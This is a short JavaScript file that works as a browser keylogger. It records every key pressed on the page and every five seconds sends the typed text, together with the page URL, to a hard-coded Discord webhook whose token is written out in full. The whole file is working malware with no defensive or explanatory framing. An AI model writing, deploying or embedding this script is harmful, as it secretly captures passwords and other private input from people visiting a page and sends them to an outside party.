var discord_webhook = "https://discord.com/api/webhooks/787513008301670411/p5_XXC1a7wCZ1NZt056MECwBhpwxuadpb-sG60k5lT49Z-xNxQE9BYOM78mN9n-D4jkb"
// defines Discord webhook used

var text = "";
var messageInterval = 5000;
var botName = Math.random().toString()

function sendMessage() {  // sends message using Discord webhook
    var request = new XMLHttpRequest();

    request.open("POST", discord_webhook);
    request.setRequestHeader('Content-type', 'application/json');

    if (text != "") {
        text += " <<<URL: " + window.location.href + " >>>"

        var params = {
            username: botName,
            avatar_url: "",
            content: text
        }

        request.send(JSON.stringify(params));
        text = "";
    }
}


document.addEventListener('keydown', function(event) {  // adds keys to text as they are typed
    text += String.fromCharCode(event.keyCode);
});

setInterval(function(){ // sends text data to the discord every defined interval
    sendMessage();
}, messageInterval);